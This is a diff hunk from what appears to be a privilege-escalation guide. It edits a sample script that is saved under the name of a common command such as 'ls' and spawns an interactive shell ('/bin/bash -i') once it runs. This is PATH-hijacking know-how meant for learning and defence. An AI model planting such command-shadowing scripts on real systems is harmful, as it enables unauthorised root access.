@@ -24,7 +24,7 @@ Write a malicious script or binary with the same name as the target command.
 ```bash
 #!/bin/bash
 echo "Privilege Escalation Achieved"
-bash # Spawns a shell
+/bin/bash -i # Spawns a shell
 ```
 
 Save this file as the name of the target command (e.g., `ls`). Grant execution permissions:
